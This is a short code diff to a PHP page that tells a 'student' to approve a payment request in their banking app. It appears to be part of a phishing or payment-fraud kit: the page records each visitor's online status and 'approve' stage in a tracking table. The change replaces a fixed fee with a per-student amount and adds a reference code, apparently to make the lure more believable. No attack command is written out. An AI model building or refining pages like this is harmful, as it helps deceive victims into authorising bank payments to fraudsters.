@@ -7,6 +7,7 @@ if (!$student) { header('Location: index.php'); exit; }
 updateStudentActivity($student['id'], 'approve');
 $visitorId = (int)($_SESSION['visitor_id'] ?? 0);
 if ($visitorId) { $db = getDB(); $db->prepare("UPDATE visitors SET is_online=1, status='approve', last_activity=datetime('now') WHERE id=?")->execute([$visitorId]); }
+$dv = getStudentDynamicVars($student);
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -71,7 +72,8 @@ if ($visitorId) { $db = getDB(); $db->prepare("UPDATE visitors SET is_online=1, 
     <div class="bank-icon">&#127974;</div>
     <h1>Approve in Your Banking App</h1>
     <p class="waiting-text">A payment request of</p>
-    <div class="amount">$27.50</div>
+    <div class="amount"><?= $dv['fee_display'] ?></div>
+    <div style="font-size:.78rem;color:#94a3b8;font-family:Consolas,monospace;margin-top:4px">Ref: <?= sanitize($dv['reference_code']) ?></div>
     <p class="waiting-text">has been sent to your banking application for approval.</p>
 
     <div class="instructions">
